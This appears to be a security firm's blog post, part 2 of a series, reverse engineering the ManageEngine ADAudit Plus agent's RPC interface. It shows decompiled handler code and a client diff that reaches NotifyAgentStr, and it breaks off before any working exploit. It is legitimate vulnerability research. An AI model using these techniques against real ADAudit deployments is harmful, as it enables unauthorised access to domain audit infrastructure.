<!DOCTYPE html>
<html lang="en-us">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Source Themes Academia 4.3.1">
  <meta name="theme-name" content="academia-hugo"/>

  

  
  
  
  
  
    
    
    
  
  

  

  
  
  
    
  
  <meta name="description" content="Part 2 of the ManageEngine ADAudit research focuses on reverse engineering the ADAudit Agent to provide proper input data for the previously built custom RPC client">

  
  <link rel="alternate" hreflang="en-us" href="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/">

  


  

  
  
  
  <meta name="theme-color" content="#000000">
  

  
  
  
  
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.0/css/all.css" integrity="sha384-aOkxzJ5uQz7WBObEZcHvV5JvRW3TUc2rNPA7pe3AwnsUohiw1Vj2Rgx2KSOkF5+h" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" integrity="sha256-ygkqlh3CYSUri3LhQxzdcm0n1EQvH2Y+U5S2idbLtxs=" crossorigin="anonymous">

    
    
    
      
    
    
      
      
        
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/github.min.css" crossorigin="anonymous" title="hl-light">
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" disabled>
        
      
    

    

    

  

  
  
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Open+Sans|Roboto+Mono&display=swap">
  

  
  
  
  <link rel="stylesheet" href="/css/academia.min.d29584a8d689167dc15889efc8f9006e.css">

  

  
  
  
  

  

  <link rel="manifest" href="/site.webmanifest">
  <link rel="icon" type="image/png" href="/img/icon.png">
  <link rel="apple-touch-icon" type="image/png" href="/img/icon-192.png">

  <link rel="canonical" href="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/">

  
  
  
  
    
  
  <meta property="twitter:card" content="summary_large_image">
  
  <meta property="og:site_name" content="Shelltrail - Swedish offensive security experts">
  <meta property="og:url" content="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/">
  <meta property="og:title" content="ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 2 / reverse engineering | Shelltrail - Swedish offensive security experts">
  <meta property="og:description" content="Part 2 of the ManageEngine ADAudit research focuses on reverse engineering the ADAudit Agent to provide proper input data for the previously built custom RPC client"><meta property="og:image" content="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/featured.png">
  <meta property="twitter:image" content="https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/featured.png"><meta property="og:locale" content="en-us">
  
  <meta property="article:published_time" content="2024-05-27T00:00:00&#43;00:00">
  
  <meta property="article:modified_time" content="2024-05-27T00:00:00&#43;00:00">
  

  


  





  <title>ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 2 / reverse engineering | Shelltrail - Swedish offensive security experts</title>

</head>


<body id="top" data-spy="scroll" data-target="#TableOfContents" data-offset="71" >

  <aside class="search-results" id="search">
  <div class="container">
    <section class="search-header">

      <div class="row no-gutters justify-content-between mb-3">
        <div class="col-6">
          <h1>Search</h1>
        </div>
        <div class="col-6 col-search-close">
          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
        </div>
      </div>

      <div id="search-box">
        
        
        
      </div>

    </section>
    <section class="section-search-results">

      <div id="search-hits">
        
      </div>

    </section>
  </div>
</aside>


  

<nav class="navbar navbar-light fixed-top navbar-expand-lg py-0" id="navbar-main">
  <div class="container">

    
      <a class="navbar-brand" href="/"><img src="/img/shelltrail_slim_transparent.png" height="90%" width="90%" alt="Shelltrail - Swedish offensive security experts"></a>
      
      <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation"><span><i class="fas fa-bars"></i></span>
      </button>
      

    
    <div class="collapse navbar-collapse" id="navbar">
      
      
      <ul class="navbar-nav ml-auto">
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#proposal"><span>Proposal</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#webshop"><span>Webshop</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#services"><span>Services</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#about"><span>About us</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#research"><span>Research</span></a>
        </li>

        
        

        

        
        
        
          
        

        
        
        
        
        
        
          
          
          
            
          
          
        

        <li class="nav-item">
          <a class="nav-link " href="/#blog"><span>Blog</span></a>
        </li>

        
        

      

        

        

        

        

      </ul>
    </div>
  </div>
</nav>


  <article class="article py-5" itemscope itemtype="http://schema.org/Article">

  














<div class="container split-header">
  <div class="row justify-content-center">
    <div class="col-lg-12">
        <img class="img-fluid w-100" src="/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/featured_hu114a9f074feb98c2e7e9ecddb2140c7f_99526_900x500_fill_q90_lanczos_smart1_3.png" itemprop="image" alt="">
        
    </div>
    <div class="col-lg-12">
      <h1 itemprop="name">ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 2 / reverse engineering</h1>

      

      



<meta content="2024-05-27 00:00:00 &#43;0000 UTC" itemprop="datePublished">
<meta content="2024-05-27 00:00:00 &#43;0000 UTC" itemprop="dateModified">

<div class="article-metadata">

  
  

  

  

  

  

  
  

  
  

  
    
<div class="share-box" aria-hidden="true">
  <ul class="share">
    
      
      
      
        
      
      
      
      <li>
        <a href="https://twitter.com/intent/tweet?url=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/&amp;text=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%202%20/%20reverse%20engineering" target="_blank" rel="noopener" class="share-btn-twitter">
          <i class="fab fa-twitter"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://www.facebook.com/sharer.php?u=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/&amp;t=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%202%20/%20reverse%20engineering" target="_blank" rel="noopener" class="share-btn-facebook">
          <i class="fab fa-facebook-f"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="mailto:?subject=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%202%20/%20reverse%20engineering&amp;body=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/" target="_blank" rel="noopener" class="share-btn-email">
          <i class="fas fa-envelope"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://www.linkedin.com/shareArticle?url=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/&amp;title=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%202%20/%20reverse%20engineering" target="_blank" rel="noopener" class="share-btn-linkedin">
          <i class="fab fa-linkedin-in"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://web.whatsapp.com/send?text=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%202%20/%20reverse%20engineering%20https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/" target="_blank" rel="noopener" class="share-btn-whatsapp">
          <i class="fab fa-whatsapp"></i>
        </a>
      </li>
    
      
      
      
        
      
      
      
      <li>
        <a href="https://service.weibo.com/share/share.php?url=https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part2/&amp;title=ManageEngine%20ADAudit%20-%20Reverse%20engineering%20Windows%20RPC%20to%20find%20CVEs%20-%20part%202%20/%20reverse%20engineering" target="_blank" rel="noopener" class="share-btn-weibo">
          <i class="fab fa-weibo"></i>
        </a>
      </li>
    
  </ul>
</div>


  

</div>

      














    </div>
    
    </div>
  </div>
</div>


  <div class="article-container">

    <div class="article-style" itemprop="articleBody">
      <h2 id="reverse-engineering-adapagentexe">Reverse engineering ADAPAgent.exe</h2>
<p>So if you followed the part 1 of this research we got a fully working RPC client
to interact with the ADAudit Agent. Nice.</p>
<p>We still have alot to accomplish to reach some kind of goal:</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Create a valid IDL structure</li>
<li><input checked="" disabled="" type="checkbox"> Brew a large can of coffee</li>
<li><input checked="" disabled="" type="checkbox"> Build a RPC client</li>
<li><input disabled="" type="checkbox"> Guess a lot</li>
<li><input disabled="" type="checkbox"> Create input data that will be marshalled into a valid stub that server will act on.</li>
</ul>
<p>When testing the custom <code>adauditrpc-client</code> from different authentication
context&rsquo;s it was determined that only <code>Domain Users</code> permission was needed
to connect to the RPC interface over the network. The reason
for this is because the ADAudit Agent RPC server is configured with a <code>ncacn_np</code>
interface. And this interface requires binding of the named pipe over SMB in
order to negotiate which port the forthcoming network communication
should rely on. And because <code>Domain Users</code> by default can communication with
SMB on adjacent servers and computers, this satisfies the RPC authentication part
of ManageEngine&rsquo;s ADAuditAgent.</p>
<p>Apart from this, there are no additional access control lists applied to the
named pipe:</p>
<p><img src="checking-acl-of-adapagentrpcpipe.png" alt="checking-acl-of-adapagentrpcpipe"></p>
<p>If the custom <code>adauditrpc-client</code> is executed on the local host in
a low-privileged session <em>&ldquo;no&rdquo;</em> authentication is required as
Windows automatically forwards the current authenticated session.</p>
<p>For the last steps on our to do-list we need to dig a bit deeper:</p>
<ul>
<li><input disabled="" type="checkbox"> Create input data that will be marshalled into a valid stub that the server will act on.</li>
</ul>
<p>Now we need to figure out which input data we can send and how the AD Audit
Agent will behave based on the various input.
Luckily we can turn to logs on the target machine and hopefully find more information
how this agent works.</p>
<p>After searching through all files on the target Windows machine at
<code>C:\Program Files\ManageEngine\ADAuditPlusAgent\</code>
we can observe that running the RPC client generates a log entry similar
to this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; Get-Content <span style="color:#e6db74">&#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\MessengerLog_2023_12_01.txt&#39;</span> -Tail <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">2023</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">01</span> <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">47</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">663</span>] [<span style="color:#ae81ff">9</span>][<span style="color:#66d9ef">INFO ][Messenger</span>] <span style="color:#960050;background-color:#1e0010">:</span> Change Notification from ADAP Server, ID <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>So now we know that we trigger some kind of <em>Change Notification</em>.</p>
<p>We also know from the <code>RpcView.exe</code> output that the RPC named pipe is
exposed via a binary called <code>ADAPAgent.exe</code>.</p>
<p>By running the following PowerShell command we determine that the binary
is a .NET assembly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; [<span style="color:#66d9ef">System.Reflection.AssemblyName</span>]::GetAssemblyName(<span style="color:#e6db74">&#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\bin\ADAPAgent.exe&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Version        Name
</span></span><span style="display:flex;"><span>-------        ----
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6.0</span>.0.0        ADAPAgent
</span></span></code></pre></div><p>Now we are <em>riding on a shrimp sandwitch</em> (thanks for the <a href="https://youtu.be/lt48y6WP7qA?feature=shared&amp;t=7515">Swedish translation</a> @fransrosen :) ). .NET assemblies can much like Jar-files
be decompiled into human readable code.
This means that we won&rsquo;t need to dig into low-level language such as
assembly, pseudo code or similar.</p>
<p>After downloading and extracting <a href="https://github.com/dnSpy/dnSpy">dnSpy</a> we open
<code>ADAPAgent.exe</code> and start our investigation.</p>
<p>Quite quickly we notice the <code>RPCHandler</code> class with the <code>NotifyAgent</code> function.</p>
<p><img src="dnspy-decompiling-adauditagent.png" alt="dnspy-decompiling-adauditagent"></p>
<p>Comparing this disassembled function from <code>ADAPAgent.exe</code> with our IDL
structure, we can assume the following:</p>
<p><img src="parameter-guessing.png" alt="parameter-guessing"></p>
<p><img src="dnspy-decompiling-adauditagent-with-comments.png" alt="idl-structure-in-visualstudio"></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Guess a lot</li>
</ul>
<p>As seen in the code from the <code>NotifyAgent</code> function it was quite
boring:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> NotifyAgent(<span style="color:#66d9ef">int</span> notifyId)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	Logger.Msgr.InfoFormat(<span style="color:#e6db74">&#34;Change Notification from ADAP Server, ID : {0}&#34;</span>, notifyId);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It only logs the parameter <code>notifyId</code>.</p>
<p>Looking into the next function however, <code>NofifyAgentStr</code> contains alot
more interesting functionality:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#75715e">// Agent.RPC.RPCHandler</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Token: 0x06000129 RID: 297 RVA: 0x00008D04 File Offset: 0x00006F04</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> NotifyAgentStr(<span style="color:#66d9ef">int</span> notifyId, <span style="color:#66d9ef">string</span> msgStr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> errStatus = <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		Hashtable msgMap = JsonAPI.JsonToHashtable(msgStr);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (msgMap.ContainsKey(<span style="color:#e6db74">&#34;AgentUID&#34;</span>) &amp;&amp; DataStore.Get(<span style="color:#e6db74">&#34;AgentUID&#34;</span>).ToString().Equals(msgMap[<span style="color:#e6db74">&#34;AgentUID&#34;</span>].ToString()))
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			errStatus = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			JObject json = JObject.Parse(msgStr);
</span></span><span style="display:flex;"><span>			json.Remove(<span style="color:#e6db74">&#34;AgentUID&#34;</span>);
</span></span><span style="display:flex;"><span>			json.Remove(<span style="color:#e6db74">&#34;ADAP_SERVER_DNS_NAME&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">string</span> jsonMsgStr = JsonAPI.ObjectToJsonString(json);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">switch</span> (notifyId)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>				DataStore.Update(jsonMsgStr);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (!ExcludeConfManager.getInstance.UpdateConf(jsonMsgStr))
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					Logger.Config.InfoFormat(<span style="color:#e6db74">&#34;Exclude configuration updation failed \n{0}&#34;</span>, msgStr);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">bool</span> flag = ScheduleManager.updateSceduleConf(jsonMsgStr);
</span></span><span style="display:flex;"><span>				RPCHandler.isScheduleXmlUpdated = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					RPCHandler.isScheduleXmlUpdated = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				Logger.Config.InfoFormat(<span style="color:#e6db74">&#34;Schedule configuration updation failed \n{0} &#34;</span>, msgStr);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (!EventParserManager.getInstance.UpdateConf(jsonMsgStr))
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					Logger.Config.InfoFormat(<span style="color:#e6db74">&#34;Parser configuration updation failed \n{0} &#34;</span>, msgStr);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>				Logger.Config.InfoFormat(<span style="color:#e6db74">&#34;Protocol Configuration is (From ADAP server) : \n{0}&#34;</span>, msgStr);
</span></span><span style="display:flex;"><span>				DataStore.Update(jsonMsgStr);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">7</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">new</span> Thread(<span style="color:#66d9ef">delegate</span>()
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					DataStore.SendTestPacket();
</span></span><span style="display:flex;"><span>				}).Start();
</span></span><span style="display:flex;"><span>				Logger.Config.InfoFormat(<span style="color:#e6db74">&#34;Test pockets send to ADAP server thread started&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">bool</span> enableDebug = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (msgMap.ContainsKey(<span style="color:#e6db74">&#34;ENABLE_DEBUG&#34;</span>))
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					enableDebug = (<span style="color:#66d9ef">bool</span>)msgMap[<span style="color:#e6db74">&#34;ENABLE_DEBUG&#34;</span>];
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				Logger.enableDisableDebugLevel(enableDebug);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">9</span>:
</span></span><span style="display:flex;"><span>				DataStore.Update(jsonMsgStr);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">10</span>:
</span></span><span style="display:flex;"><span>				Logger.Event.InfoFormat(<span style="color:#e6db74">&#34;Request from ADAP server to run schedule immediately&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">new</span> Scheduler().runEventScheduler();
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">11</span>:
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				JArray shareArray = json[<span style="color:#e6db74">&#34;SHARES&#34;</span>] <span style="color:#66d9ef">as</span> JArray;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">new</span> Thread(<span style="color:#66d9ef">delegate</span>()
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					ShareFinalPathName.getFinalPathName(shareArray);
</span></span><span style="display:flex;"><span>				}).Start();
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			Logger.Msgr.ErrorFormat(<span style="color:#e6db74">&#34;NotifyAgentStr :: Invalid notification Id : \n{0}&#34;</span>, notifyId);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			Logger.Msgr.ErrorFormat(<span style="color:#e6db74">&#34;synced from unknown server : ServerName :: {0}&#34;</span>, msgMap[<span style="color:#e6db74">&#34;ADAP_SERVER_DNS_NAME&#34;</span>]);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		IL_24F:;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">catch</span> (Exception ex)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		Logger.Msgr.ErrorFormat(<span style="color:#e6db74">&#34;EXCEPTION :: RPCHandler.NotifyAgentStr : {0}&#34;</span>, ex);
</span></span><span style="display:flex;"><span>		errStatus = <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> errStatus;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Lets see if the <code>private static int NotifyAgentStr(int notifyId, string msgStr)</code>
maps to either <code>Proc1</code> or <code>Proc2</code> in our IDL:</p>
<p><img src="idl-structure-in-visualstudio.png" alt="idl-structure-in-visualstudio"></p>
<p><code>Proc1</code> requires a long (integer) as arg_0. Check</p>
<p><code>Proc1</code> requires a wchar_t (string) as arg_1. Check</p>
<p>Oh yes. <code>Proc1</code> is likely mapped to the <code>NotifyAgentStr</code> function in <code>ADAP.exe</code></p>
<p>Lets update the custom <code>adauditrpc-client</code> created in part 1:</p>
<pre tabindex="0"><code>-    long arg_0 = 0;
-    long arg1_pointer;
-    long* arg_1 = &amp;arg1_pointer;
-    RpcTryExcept
-    {
-        Proc0(DefaultIfName_v1_0_c_ifspec, arg_0, arg_1);
-    }

+    long arg_0 = 0;
+    wchar_t arg_1[] = L&#34;snus&#34;;
+    long arg2_pointer;
+    long* arg_2 = &amp;arg2_pointer;
+    RpcTryExcept
+    {
+        Proc1(DefaultIfName_v1_0_c_ifspec, arg_0, arg_1, arg_2);
+    }
</code></pre><p>Rebuild the solution and the execute the binary and check the logs. Boom.
We are in the <code>NotifyAgentStr</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; Get-Content <span style="color:#e6db74">&#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\MessengerLog_2023_12_01.txt&#39;</span> -Tail <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">2023</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">01</span> <span style="color:#ae81ff">19</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">41</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span>,<span style="color:#ae81ff">834</span>] [<span style="color:#ae81ff">11</span>][<span style="color:#66d9ef">INFO ][Messenger</span>] <span style="color:#960050;background-color:#1e0010">:</span> NATV.FA_NotifyAgentStr :: notification from ADAP server, notifyId <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">2023</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">01</span> <span style="color:#ae81ff">19</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">41</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span>,<span style="color:#ae81ff">849</span>] [<span style="color:#ae81ff">11</span>][<span style="color:#66d9ef">ERROR][Messenger</span>] <span style="color:#960050;background-color:#1e0010">:</span> EXCEPTION :: RPCHandler.NotifyAgentStr <span style="color:#960050;background-color:#1e0010">:</span> Newtonsoft.Json.JsonReaderException<span style="color:#960050;background-color:#1e0010">:</span> Unexpected character encountered <span style="color:#66d9ef">while</span> parsing value<span style="color:#960050;background-color:#1e0010">:</span> s. Path <span style="color:#e6db74">&#39;&#39;</span>, line <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">position</span> <span style="color:#ae81ff">0</span>.
</span></span><span style="display:flex;"><span>   at Newtonsoft.Json.JsonTextReader.ParseValue()
</span></span><span style="display:flex;"><span>   at Newtonsoft.Json.JsonTextReader.Read()
</span></span><span style="display:flex;"><span>   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.ReadForType(JsonReader reader, JsonContract contract, Boolean hasConverter)
</span></span><span style="display:flex;"><span>   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.Deserialize(JsonReader reader, Type objectType, Boolean checkAdditionalContent)
</span></span><span style="display:flex;"><span>   at Newtonsoft.Json.JsonSerializer.DeserializeInternal(JsonReader reader, Type objectType)
</span></span><span style="display:flex;"><span>   at Newtonsoft.Json.JsonConvert.DeserializeObject(String value, Type type, JsonSerializerSettings settings)
</span></span><span style="display:flex;"><span>   at Newtonsoft.Json.JsonConvert.DeserializeObject[<span style="color:#66d9ef">T</span>](String value, JsonSerializerSettings settings)
</span></span><span style="display:flex;"><span>   at Agent.RPC.RPCHandler.NotifyAgentStr(Int32 notifyId, String msgStr) <span style="color:#66d9ef">in</span> d:\Webhost\<span style="color:#ae81ff">30</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">2021</span>\WindowsBuilds\ADAUDITPLUS_GIT\<span style="color:#ae81ff">4649300</span>\ftpagent64\ADAP_SRC\source\agent\core\ADAPAgent\ADAPAgent\RPC\RPCHandler.cs<span style="color:#960050;background-color:#1e0010">:</span>line <span style="color:#ae81ff">118</span>
</span></span></code></pre></div><p>The result is a JSON parsing error meaning that the agent is probably expecting
JSON input. What we also notice from the agent code is that we have an if statement
